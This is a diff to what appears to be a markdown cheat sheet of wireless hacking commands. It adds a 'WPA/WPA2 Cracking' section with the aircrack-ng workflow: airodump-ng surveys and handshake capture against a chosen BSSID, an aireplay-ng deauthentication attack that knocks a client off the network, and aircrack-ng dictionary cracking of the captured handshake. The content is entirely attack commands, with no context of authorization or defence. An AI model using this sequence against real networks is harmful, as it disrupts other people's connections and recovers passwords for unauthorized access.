@@ -12,3 +12,21 @@ sudo airmon-ng check kill
 sudo iwconfig wlan0 mode monitor
 iwconfig
 ```
+
+## WPA/WPA2 Cracking
+### Broad Survey
+```
+sudo airodump-ng --band abg <interface>
+```
+### Targeted Survey
+```
+sudo airodump-ng –bssid <bssid> –channel <#> -w <filename> <interface>
+```
+### Deauth
+```
+sudo aireplay-ng -0 <#> -a <bssid> -c <client MAC> <interface>
+```
+### Crack WPA2 Password
+```
+sudo aircrack-ng -w <dictionary file> <capture file> 
+```
